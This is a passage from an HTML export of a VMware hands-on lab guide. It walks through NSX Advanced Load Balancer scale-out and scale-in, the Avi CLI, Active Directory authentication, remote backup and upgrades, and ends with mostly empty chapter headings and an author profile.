<p>Place your mouse over the virtual service name and the details page you can see in the screenshot above will appear.</p>
<p>First notice the SE the service is currently hosted on. 
Note: your SE name might be a little different.</p>
<p>Click <strong>Scale Out</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/095/original/573e06f7-a8de-4dc9-b329-806691fbd5d6.png" alt="" /></p>
<ol>
<li>Select the second SE from the drop-down.</li>
<li>Click <strong>Scale out</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/097/original/a27c7e94-299f-424a-b9f6-0a3bd5d55447.png" alt="" /></p>
<p>A pop-up windows will indicate the scale-out progress which should disappear after while.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/099/original/1191aecd-f3e2-4208-bdd3-2c30c8236eb1.png" alt="" /></p>
<p>Place your mouse over the virtual service name again. We can see the VS is now running on both SEs.</p>
<h4 id="211-changes-in-nsx-t"><a class="header" href="#211-changes-in-nsx-t">2.1.1. Changes in NSX-T</a></h4>
<p>Did the scale-out operation triggered any changes in NSX-T? Well lets find out!</p>
<p>Do you remember the step in the previous guide, when we verified the static route on the T1 with one next hop configured (step 2.5.4)?</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/101/medium/55472cd1-7305-4512-8327-d45dcd42d780.png" alt="" /></p>
<p>Please open the management UI of NSX-T.</p>
<ol>
<li>Click <strong>Networking</strong> in top menu.</li>
<li>Select <strong>Tier-1 Gateways</strong></li>
<li>Expand the details view for the <strong>T1-GATEWAY</strong></li>
<li>Expand <strong>STATIC ROUTES</strong> and click the &quot;<strong>1</strong>&quot; in the section</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/103/original/5ccdbddd-5fd5-4aea-8203-89a75491b20a.png" alt="" /></p>
<ol>
<li>We can see the virtual IP of the virtual service</li>
<li>But now have two next hops configured. Please click the &quot;<strong>2</strong>&quot;</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/105/original/9fde709b-ad70-4b0b-ad34-7ac7876ce935.png" alt="" /></p>
<p>The scale-out operation in ALB added a second static route with the same administrative distance to the gateway.</p>
<p>When a virtual service is scaled out, the ALB controller adds equal cost next hops pointing to each SE where the the virtual service is placed. The tier-1 spreads out the incoming connections over the SEs, using Equal Cost Multi-Pathing (ECMP). </p>
<p>Click <strong>CLOSE</strong> here and on the Static Route window.</p>
<h4 id="212-scale-in-service"><a class="header" href="#212-scale-in-service">2.1.2. Scale-In Service</a></h4>
<p>We have demonstrated how easy it is to scale-out a virtual service. In our lab environment it is beneficial when we scale-in again:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/107/original/379ef5f9-044d-4341-bb3f-49f7eccae7b2.png" alt="" /></p>
<ol>
<li>Place your mouse over the VS name again.</li>
<li>Click <strong>Scale In</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/109/original/516d457c-ab21-44a0-8203-c9a646a2f267.png" alt="" /></p>
<ol>
<li>Select the SE marked as **Primary<br />
**Note: Your SE names might be different.</li>
<li>Press <strong>Scale In</strong></li>
</ol>
<blockquote>
<p>We are sure you already noticed but to migrate a VS from one SE to another follows the same procedure. Just click Migrate in the VS details window.</p>
</blockquote>
<h3 id="22-nsx-advanced-load-balancer-cli"><a class="header" href="#22-nsx-advanced-load-balancer-cli">2.2. NSX Advanced Load Balancer CLI</a></h3>
<p>In this section we want to provide just one or two tips how to use the CLI.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/209/medium/5d933ba5-034f-4ef1-b725-39d6f05352ee.png" alt="" /></p>
<p>Please open putty and start the pre-configured session: <strong>avi-01a</strong></p>
<ul>
<li>Please login as: <strong>admin</strong></li>
<li>Passoword: <strong>VMware1!</strong></li>
</ul>
<p>This will bring you to bash shell of the controller.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/211/medium/fb4cb70f-76de-4cf6-b6df-86083de2855d.png" alt="" /></p>
<ol>
<li>To start the AVI shell, enter: shell</li>
<li>You have to provide the admin credentials once again: <strong>admin</strong>/<strong>VMware1!</strong></li>
</ol>
<p>Now you can run controller commands like:</p>
<ul>
<li><code>show cloud</code></li>
<li><code>show cloud nsxmgr-01a analysis</code></li>
</ul>
<blockquote>
<p>To see all available commands, enter: <code>help</code></p>
<p>Another way to get information about available arguments, enter the command and press <tab> twice: <code>show &lt;tab&gt;&lt;tab&gt;</code></p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/213/medium/88aab0dc-334e-45f5-a234-57b43ef5816a.png" alt="" /></p>
<p> A good use-case for the CLI is to check the CPU load of our service engines.</p>
<p>When you check the CPU utilization reported by vCenter Server you might be surprised that it is quite high - even there is NO virtual service running on the SE. The reason for this behavior is explained here:<br />
<a href="https://avinetworks.com/docs/20.1/faq-hypervisor-reports-high-cpu-utilization-of-service-engine/">https://avinetworks.com/docs/20.1/faq-hypervisor-reports-high-cpu-utilization-of-service-engine/</a></p>
<p>So we can use the CLI to get a comprehensive CPU utilization report:</p>
<ul>
<li>First we want to get a list of our SEs: <code>show serviceengine</code></li>
<li>The CPU report can be viewed by: <code>show serviceengine &lt;SEName&gt; cpu</code></li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/546/medium/7fd39fe8-b73d-4cee-8628-53fd01bcc816.png" alt="" /></p>
<p>Above an example to get configuration information about a virtual service:</p>
<ul>
<li><code>show virtualservice</code></li>
<li><code>show virtualservice &lt;VSName&gt;</code></li>
</ul>
<blockquote>
<p>But the CLI can also help with API calls:</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/548/medium/b63f2b94-4253-42a8-a3c5-43d592b40baa.png" alt="" /></p>
<p>The command: <code>show virtualservice --api-detail</code> Will not only provide the desired information, but also the API. Note: to preserve readability we truncated the output!</p>
<blockquote>
<p>The command: <code>terminal display_api_details</code></p>
<p>Makes the output shown above the default. So all commands you enter will also return the API call.</p>
</blockquote>
<h3 id="23-active-directory-authentication-and-rbac"><a class="header" href="#23-active-directory-authentication-and-rbac">2.3. Active Directory Authentication and RBAC</a></h3>
<p><strong>Customer Request:</strong> NSX Advanced Load Balancer must be integrated with the company's Active Director for user authentication.</p>
<p><strong>Task:</strong> Connect the ALB to the CORP.LOCAL domain. And assign the role <strong>Application-Operator</strong> to the AD-group <strong>IT</strong>.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/781/medium/229be99d-b623-4fb2-b743-aa5f203a4b58.png" alt="" /></p>
<p>First we need to create an Authentication Profile.</p>
<ol>
<li>Select <strong>Templates</strong> from the system menu in the top left corner.</li>
<li>Click <strong>Security</strong></li>
<li>Select <strong>Auth Profile</strong></li>
<li>Click <strong>CREATE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/783/medium/6d791d21-97e7-4ddf-8db9-488c35df2ff1.png" alt="" /></p>
<p>OK... there is a lot to enter. Please use copy/past to avoid any typos:</p>
<ul>
<li>Name: <strong>CORP.LOCAL</strong></li>
<li>Set Type: <strong>LDAP</strong></li>
<li>LDAP Servers: **controlcenter.corp.local<br />
**Note: In a production environment you can add several LDAP servers.</li>
<li>Base DN: <strong>DC=corp,DC=local</strong></li>
<li>Admin Bind DN: <strong>CN=Administrator,CN=Users,DC=corp,DC=local</strong></li>
<li>Admin Bind Password: <strong>VMware1!</strong></li>
<li>User Search DN: <strong>CN=Users,DC=corp,DC=local</strong></li>
<li>Group Search DN: <strong>CN=Users,DC=corp,DC=local</strong></li>
<li>User ID Attribute: <strong>samAccountName</strong></li>
<li>Group Filter: <strong>(objectCategory=group)</strong></li>
</ul>
<p>Click <strong>Save</strong></p>
<p>Next we have to activate the new Authentication Profile:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/785/medium/1ed5e3de-4a5b-4761-ab1c-6a282be16976.png" alt="" /></p>
<ol>
<li>Switch to <strong>Administration</strong></li>
<li>Click <strong>Settings</strong></li>
<li>Make sure you are viewing the <strong>Authentication/Authorization</strong> tab</li>
<li>Click the <strong>edit</strong> icon</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/787/original/6cae2926-4956-4419-8659-f742279ec5a3.png" alt="" /></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/787/original/6cae2926-4956-4419-8659-f742279ec5a3.png" alt="" /></p>
<ol>
<li>Activate <strong>Remote</strong> Authentication</li>
<li>Select the <strong>CORP.LOCAL</strong> Auth Profile</li>
<li>Make sure you keep <strong>Allow local user login</strong> enabled</li>
<li>Click <strong>Save</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/789/medium/31d08aca-cabf-4b71-9e13-c99935aff29b.png" alt="" /></p>
<ol>
<li>The authentication type and profile is now shown in the UI</li>
<li>Click <strong>New Mapping</strong> to add a role to an AD Group</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/791/original/33080dfa-a912-45fa-a79d-6837a8446767.png" alt="" /></p>
<ol>
<li>Select <strong>Member</strong></li>
<li>Add the group name: <strong>IT</strong></li>
<li>User Role: <strong>Selected</strong></li>
<li>Assign the role: <strong>Application-Operator</strong></li>
<li>Click <strong>Save</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/793/medium/53eb2ce0-2b74-4719-84fd-b33a5c892fd8.png" alt="" /></p>
<p>The new Role Mapping is show in the UI.</p>
<h4 id="231-test-ad-login"><a class="header" href="#231-test-ad-login">2.3.1. Test AD-Login</a></h4>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/795/original/35831931-a895-47c7-8328-ded21d358324.png" alt="" /></p>
<p>Sign Out from your System Administrator account.</p>
<ol>
<li>Click the <strong>AVI Networks icon</strong> in the top right corner</li>
<li>Click <strong>Sign Out</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/134/925/original/353891e1-77d8-43c7-be6e-4dfa6c885808.png" alt="" /></p>
<p>Now lets login with the user account olive - which is a member of the IT group:</p>
<ul>
<li>Username: <strong>olive</strong></li>
<li>Password: <strong>VMware1!</strong></li>
<li>Click <strong>LOG IN</strong></li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/797/medium/d4dded5c-853a-40e4-a965-5414c8ccd127.png" alt="" /></p>
<p>As Application-Operator you do not have access to the System menu:</p>
<ol>
<li>Select <strong>Administration</strong> from the system menu.</li>
<li>You will not have access to the <strong>System</strong> view.</li>
<li>Clicking on the AVI Networks icon will reveal the user name.</li>
<li>Do you know why you see &quot;admin&quot; in the menu bar?<br />
Hint: this has to do with Tenants....</li>
</ol>
<blockquote>
<p>Please login with the admin account again to proceed with the tasks.</p>
</blockquote>
<h3 id="24-remote-backup"><a class="header" href="#24-remote-backup">2.4. Remote Backup</a></h3>
<p>For production environments its is essential to have a backup of your management tools. So lets explore how to configure this with the ALB.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/550/original/588affc8-a1b3-420b-afc6-7498de30a359.png" alt="" /></p>
<p>For our demonstration we will use the ubuntu-utils virtual machine. Please use putty and the pre-configured session to connect to it.</p>
<ul>
<li>Login using livefire/VMware1!</li>
<li>Create a folder to store your backups to: <code>mkdir avi-01a.backup</code></li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/552/medium/d883dad2-03f6-4eb8-8b41-0e0c65b9f04d.png" alt="" /></p>
<p>Please switch back to the management UI of the ALB controller.</p>
<ol>
<li>Go to <strong>Administration</strong></li>
<li>Click <strong>System</strong></li>
<li>You should be on the <strong>Configuration Backup</strong> tab</li>
<li>Click the edit icon</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/554/original/7528dcd8-2d34-447c-855a-cb2ca2d67a41.png" alt="" /></p>
<ol>
<li>Enable: <strong>Remote Server</strong></li>
<li>Server Address: <strong>192.168.110.11</strong></li>
<li>Directory: <code>/home/livefire/avi-01a.backup</code></li>
<li>Open the drop-down of User Credentials and click <strong>Create SSH User</strong> (not shown)</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/556/original/96df3fd5-abbc-42ab-8671-da525cedbcaf.png" alt="" /></p>
<p>Enter the following information:</p>
<ul>
<li>Name: <strong>livefire</strong></li>
<li>Credential Type: <strong>SSH</strong></li>
<li>Authentication: <strong>Password</strong></li>
<li>Password: <strong>VMware1!</strong></li>
</ul>
<p>Click <strong>Save</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/558/original/c5786cfc-2ab5-4e91-a632-af9ef5e2522e.png" alt="" /></p>
<p>Finish the configuration by clicking <strong>Save</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/560/medium/17a5b4dc-ad68-43fa-bd42-728640cf820b.png" alt="" /></p>
<p>Remote Backup is now Enabled.</p>
<p>As we kept the backup cycle in our lab environment at 1 day, you can check the content of the backup folder tomorrow.  :-)</p>
<h3 id="25-information-only-update-procedure"><a class="header" href="#25-information-only-update-procedure">2.5. Information only: Update Procedure</a></h3>
<blockquote>
<p>Performing an update is a task that every administrator has to perform sooner or later. To make you familiar with this process we included this information only section.</p>
<p>In this example we update from 20.1.3 to 20.1.4.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/564/medium/b1182d73-fb7a-403c-9608-4058a2301186.png" alt="" /></p>
<p>First we need to upload the update package to our controller:</p>
<ol>
<li>Go to <strong>Administration</strong></li>
<li>Click <strong>Controller</strong></li>
<li>Select the <strong>Software</strong> tab</li>
<li>Click <strong>Upload From Computer</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/570/medium/535ced8f-bdd2-4328-8457-0057812ac988.png" alt="" /></p>
<ol>
<li>Navigate to the downloaded update package.</li>
<li>Click <strong>Open</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/320/medium/dd39e7b6-5ffd-4004-b316-dd247c0d04ce.png" alt="" /></p>
<p>The upload progress is indicated in the UI.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/574/medium/48e83d56-587a-46a2-8785-5ed1fc7f2d4d.png" alt="" /></p>
<p>After a few minutes the update is completed and the new version is listed on your controller.</p>
<h4 id="251-controller-update"><a class="header" href="#251-controller-update">2.5.1. Controller Update</a></h4>
<p>The first component we want to update is the controller itself.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/577/medium/29fb6bf6-5c22-4729-a13f-9b4a3e9ea709.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>System Update</strong> tab.</li>
<li>Mark the new software package.</li>
<li>Click <strong>UPGRADE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/579/original/0f432679-e23b-4ac0-93e7-32f9fbe6e39b.png" alt="" /></p>
<ul>
<li>For now we want to update the controller only. Deactivate <strong>Upgrade all Service Engine Groups</strong>.</li>
<li>Click <strong>Continue</strong></li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/581/original/ccc6a11f-15b5-4095-9d65-94d994855b72.png" alt="" /></p>
<p>We have just configured a remote backup in the task before - so we are ready to go! Click <strong>Confirm</strong>.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/583/medium/72b9252d-7751-4b00-a4bc-f5fb41f0ac5f.png" alt="" /></p>
<p>Update is in progress...</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/332/original/eb171c6a-60f7-479c-9eec-06d8370f11f3.png" alt="" /></p>
<p>You will sooner or later loose connectivity to the management UI. That is normal!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/334/medium/e3cca6f0-daa3-4736-b372-c51f923510c5.png" alt="" /></p>
<p>After a few minutes you will presented with the login screen again.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/336/medium/5a3c456e-5315-4305-bea0-e6f32877fe1a.png" alt="" /></p>
<p>The update process is still in progress. Patience!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/585/medium/cb805cb9-c614-4f8f-a856-1aa314b4f6e5.png" alt="" /></p>
<p>After a few more minutes the controller update is completed. And the new version is shown in the UI.</p>
<h4 id="252-security-engine-group-update"><a class="header" href="#252-security-engine-group-update">2.5.2. Security Engine Group Update</a></h4>
<p>Next we want to update the Service Engine Groups.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/587/medium/15c87575-663f-4e18-9e12-530ec7730175.png" alt="" /></p>
<ol>
<li>Switch to the <strong>SEG Update</strong> tab</li>
<li>Select the SEG you want to update. You can see the SEG name and also the Cloud it belongs to.</li>
<li>Click <strong>Upgrade</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/589/original/7cf2b958-6bae-47ec-8112-d06e83408d08.png" alt="" /></p>
<p>Click <strong>Next</strong>.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/591/original/8f3e71e6-19e8-4b50-898f-a8491b876339.png" alt="" /></p>
<ul>
<li>To <strong>Suspend</strong> the update process if there are any errors is a good idea.</li>
<li>Click <strong>Continue</strong></li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/593/original/21ca16e4-a6a6-4861-942e-d096dec8f099.png" alt="" /></p>
<ol>
<li>Please note the first warning: Remember, our VS is running on one SE only...!</li>
<li>Press <strong>Confirm</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/595/medium/e1b28820-51eb-443e-91a1-1cc1befd302e.png" alt="" /></p>
<p>Update in progress...</p>
<blockquote>
<p>Remember how ALB manages the images for the SEs? It is using a Content Library!</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/350/medium/e6a470e8-e6f2-44df-90be-f5804fe122b0.png" alt="" /></p>
<p>So, the first task for the SE update is to first delete the old SE image and upload a new one.</p>
<p>And then it will update the existing SEs.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/597/medium/e080717a-b6f6-4531-b5ab-0d8023418028.png" alt="" /></p>
<p>After a few minutes the SEG update process is finished.</p>
<blockquote>
<p>Congratulations! You finished the Service Optimization and Operations lab.</p>
<p>We hope, you enjoyed it or at least found some useful information. Now its time for a break!</p>
</blockquote>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="41-lab-introduction"><a class="header" href="#41-lab-introduction">4.1 Lab Introduction</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="42-nsx-advanced-load-balancer-cloud-preparation"><a class="header" href="#42-nsx-advanced-load-balancer-cloud-preparation">4.2 NSX Advanced Load Balancer Cloud preparation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="43-avi-kubernetes-operator-for-tkg"><a class="header" href="#43-avi-kubernetes-operator-for-tkg">4.3 Avi Kubernetes Operator for TKG</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="44-tkg-workload-l4-load-balancing"><a class="header" href="#44-tkg-workload-l4-load-balancing">4.4 TKG Workload L4 load Balancing</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="45-tkg-workload-l7-load-balancing"><a class="header" href="#45-tkg-workload-l7-load-balancing">4.5 TKG Workload L7 Load Balancing</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="46-tkg-workload-security-with-antrea-networkpolicy"><a class="header" href="#46-tkg-workload-security-with-antrea-networkpolicy">4.6 TKG Workload Security with Antrea NetworkPolicy</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="51-nsx-cloud-environment-overview"><a class="header" href="#51-nsx-cloud-environment-overview">5.1 NSX Cloud Environment Overview</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="52-validate-csm-registration-with-nsx-manager"><a class="header" href="#52-validate-csm-registration-with-nsx-manager">5.2 Validate CSM Registration with NSX Manager</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="53-enable-csm-to-access-your-aws-inventory"><a class="header" href="#53-enable-csm-to-access-your-aws-inventory">5.3 Enable CSM to access your AWS inventory</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="54-nsx-enforced-mode---prepare-workloads-in-self-managedtransit-aws-vpc"><a class="header" href="#54-nsx-enforced-mode---prepare-workloads-in-self-managedtransit-aws-vpc">5.4 NSX Enforced Mode - Prepare workloads in Self-Managed/Transit AWS VPC</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="55-nsx-enforced-mode---deploy-nsx-pcg-in-a-self-managedtransit-vpc"><a class="header" href="#55-nsx-enforced-mode---deploy-nsx-pcg-in-a-self-managedtransit-vpc">5.5 NSX Enforced Mode - Deploy NSX PCG in a Self-Managed/Transit VPC</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="56-nsx-enforced-mode---onboard-workload-vms"><a class="header" href="#56-nsx-enforced-mode---onboard-workload-vms">5.6 NSX-Enforced Mode - Onboard Workload VMs</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="57-nsx-enforced-mode---connect-on-premise-dc-with-aws-vpc-leveraging-ipsec-vpn"><a class="header" href="#57-nsx-enforced-mode---connect-on-premise-dc-with-aws-vpc-leveraging-ipsec-vpn">5.7 NSX Enforced mode - Connect on-premise DC with AWS VPC leveraging IPSEC VPN</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="58-nsx-enforced-mode---setup-micro-segmentation-for-workloads"><a class="header" href="#58-nsx-enforced-mode---setup-micro-segmentation-for-workloads">5.8 NSX Enforced Mode - Setup Micro-segmentation for workloads</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="59-onboarding-into-avi-load-balancer"><a class="header" href="#59-onboarding-into-avi-load-balancer">5.9 Onboarding into AVI Load Balancer</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="510-nsx-enforced-mode---threat-detection-and-remediation-using-the-quarantine-policy"><a class="header" href="#510-nsx-enforced-mode---threat-detection-and-remediation-using-the-quarantine-policy">5.10 NSX Enforced Mode - Threat detection and remediation using the Quarantine policy</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx"><a class="header" href="#nsx">NSX</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-2"><a class="header" href="#installation-2">Installation</a></h1>
<p>NSX-T Installation: Deploy Additional NSX-T Manager Nodes from UI</p>
<p>login into the MSX manager UI https://nsxmanagerip</p>
<p>Click System -&gt; Overview -&gt; Add Nodes:</p>
<p><img src="https://i0.wp.com/virtual-llew.com/wp-content/uploads/2020/02/image-56.png?fit=640%2C474&amp;ssl=1" alt="" /></p>
<p>2Select the Compute Manager from the drop-down menu, enable SSH (if required), enter the cli and root password, DNS, NTP and select the form factor:</p>
<p><strong><em>Note:</em></strong> <em>Select the same form factor as of the first NSX-T manager deployment in</em> <a href="https://virtual-llew.com/nsx-t-deployment-deploy-nsx-t-manager/">https://virtual-llew.com/nsx-t-deployment-deploy-nsx-t-manager/</a></p>
<p><img src="https://i1.wp.com/virtual-llew.com/wp-content/uploads/2020/02/image-57.png?fit=640%2C511&amp;ssl=1" alt="" /></p>
<p>Specify the name, vSphere cluster, datastore and network details:</p>
<p><img src="https://i2.wp.com/virtual-llew.com/wp-content/uploads/2020/02/image-58.png?fit=640%2C510&amp;ssl=1" alt="" /></p>
<p>The status could now be monitored from the same screen, screenshot below showing <em>deployment in progress</em>:</p>
<p><img src="https://i1.wp.com/virtual-llew.com/wp-content/uploads/2020/02/image-59.png?fit=640%2C362&amp;ssl=1" alt="" /></p>
<p>A successful deployment will show the “Management Cluster” as <em>Stable</em>, “Cluster Connectivity” as <em>Up</em> and “Repository Status” as <em>Sync Complete</em>, as shown in the screenshot below:</p>
<p><img src="https://i1.wp.com/virtual-llew.com/wp-content/uploads/2020/02/image-60.png?fit=640%2C362&amp;ssl=1" alt="" /></p>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="sd-wan-by-velocloud"><a class="header" href="#sd-wan-by-velocloud">SD-WAN by VeloCloud</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-3"><a class="header" href="#installation-3">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx-alb"><a class="header" href="#nsx-alb">NSX ALB</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-4"><a class="header" href="#installation-4">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx-service-defined-firewall"><a class="header" href="#nsx-service-defined-firewall">NSX Service-defined Firewall</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-5"><a class="header" href="#installation-5">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx-cloud"><a class="header" href="#nsx-cloud">NSX Cloud</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-6"><a class="header" href="#installation-6">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx-intelligence"><a class="header" href="#nsx-intelligence">NSX Intelligence</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-7"><a class="header" href="#installation-7">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="vrni"><a class="header" href="#vrni">vRNI</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-8"><a class="header" href="#installation-8">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx-service-mesh"><a class="header" href="#nsx-service-mesh">NSX Service Mesh</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-9"><a class="header" href="#installation-9">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="nsx-distributed-idsips"><a class="header" href="#nsx-distributed-idsips">NSX Distributed IDS/IPS</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-10"><a class="header" href="#installation-10">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="hcx"><a class="header" href="#hcx">HCX</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="installation-11"><a class="header" href="#installation-11">Installation</a></h1>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="about"><a class="header" href="#about">about</a></h1>
<p>khyoon</p>
<p>Profile
VMware VCN Engineer
NSX, NSX ALB, SD-WAN, vRNI, HCX</p>
<p>at Goodmorning Information Technology Co., Ltd.</p>
<p>Republic of Korea</p>
<p>EMail: hwi0906@gmail.com</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
